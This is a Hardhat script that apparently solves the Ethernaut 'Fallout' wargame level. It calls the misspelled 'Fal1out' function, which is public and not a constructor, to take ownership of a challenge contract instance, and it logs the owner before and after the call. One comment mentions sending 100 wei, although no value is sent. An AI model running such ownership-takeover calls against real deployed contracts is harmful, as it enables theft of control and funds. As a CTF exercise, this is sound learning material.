const hre = require("hardhat");

async function main() {
  const MyContract = await ethers.getContractFactory("Fallout");
  const contract = await MyContract.attach(
    "0xF8E4547B4a485777C325e5eAb09E38F1468126a5" // This is the contract address that you get from starting your instance
  );

  // You can check that we are not the owner initially
  const owner1 = await contract.owner();
  console.log("The owner initially is", owner1);

  // Realize that there is a typo in fal1out so it is a normal function instead of the constructor
  const tx1 = await contract.Fal1out(); // we contribute with 100 wei
  const tx1Receipt = await tx1.wait(1);

  // Verify that you're the owner of the contract
  const owner2 = await contract.owner();
  console.log("The owner now is", owner2);
}

// Recommended pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
